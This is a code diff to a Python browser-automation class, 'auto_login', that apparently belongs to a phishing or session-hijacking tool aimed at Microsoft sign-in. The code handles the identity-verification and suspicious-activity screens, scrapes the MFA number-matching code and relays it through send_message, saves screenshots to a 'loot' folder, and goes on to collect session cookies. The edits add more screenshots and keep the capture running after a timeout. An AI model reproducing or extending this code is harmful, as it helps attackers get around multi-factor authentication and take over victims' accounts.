@@ -123,18 +123,19 @@ class auto_login:
             # Waiting for an action to happen
         OTP_wait_time = 120
         while True:
-            print("222")
             if OTP_wait_time == 0 :
-                self.send_message("reached_max_waiting")
+                self.send_message("reached_max_waiting, continuing just in case")
                 page.screenshot(path=f"{self.loot_location}/last_screen.png")
-                return
+                # context.close()
+                # browser.close()
+                # return
+                break
             
             OTP_wait_time -=1 
             time.sleep(1)
             curr_time = time.time()
             # wait for 20 second max for the page to load 
             while time.time() - curr_time < 20:
-                print("111")
                 # Yes this is the best solution that i con think of for this error :) 
                 # Page.content: Unable to retrieve content because the page is navigating and changing the content.
                 try:
@@ -158,10 +159,12 @@ class auto_login:
             elif "Suspicious activity detected" in page_content:
                 time.sleep(2)
                 self.send_message("Suspicious_activity_detected")
+                page.screenshot(path=f"{self.loot_location}/suspicious_screen.png")
                 page.locator("#idSIButton9").click()
                 # continue
             elif "Verify your identity" in page_content:
                 self.send_message("Verify_your_identity_detected")
+                page.screenshot(path=f"{self.loot_location}/verify_screen.png")
                 locators = [
                     'xpath=//*[@id="idDiv_SAOTCS_Proofs"]/div/div',
                     'xpath=//*[@id="idDiv_SAOTCS_Proofs"]/div[1]/div'
@@ -178,9 +181,12 @@ class auto_login:
                 # Get the OTP
                 self.OTP = page.locator("#idRichContext_DisplaySign").text_content()
                 self.send_message(msg="OTP_code", data=self.OTP)
-            else:
-                self.send_message("unkown_screen_detected")
-                page.screenshot(path=f"{self.loot_location}/unkown_screen.png")
+            # else:
+            # i think better not having it as it has false positive when switching between screens
+            #     self.send_message("unkown_screen_detected")
+            #     page.screenshot(path=f"{self.loot_location}/unkown_screen.png")
+            #     # continue with the capture incase its a custom screen
+            #     break
 
         # --------------------- Cookies
         self.send_message("Getting cookies")
